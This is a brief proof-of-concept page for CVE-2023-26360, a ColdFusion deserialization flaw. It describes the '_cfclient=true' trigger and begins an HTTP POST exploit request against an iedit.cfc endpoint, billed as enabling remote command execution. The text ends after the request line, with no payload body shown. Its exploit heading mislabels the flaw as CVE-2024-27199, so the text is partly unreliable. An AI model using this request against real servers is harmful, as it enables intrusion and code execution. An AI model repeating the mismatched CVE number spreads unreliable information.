CVE-2023-26360 Proof-of-concept (POC)
----------------------
CVE-2023-26360 is an improper access control vulnerability caused by deserializing untrusted data without proper validation. When an attacker crafts a malicious HTTP request with "_cfclient=true" in the URL, the Adobe ColdFusion server invokes the "convertToTemplateProxy" function and deserializes the malicious JSON input provided by the attacker. Adversaries use this method for different purposes, such as arbitrary code execution, arbitrary file read, and remote code execution. 

The example HTTP POST request below exploits CVE-2023-26360 vulnerability to execute arbitrary commands remotely.

#### Example CVE-2024-27199 Exploit:
```http
POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo^&_cfclient=true HTTP/1.1
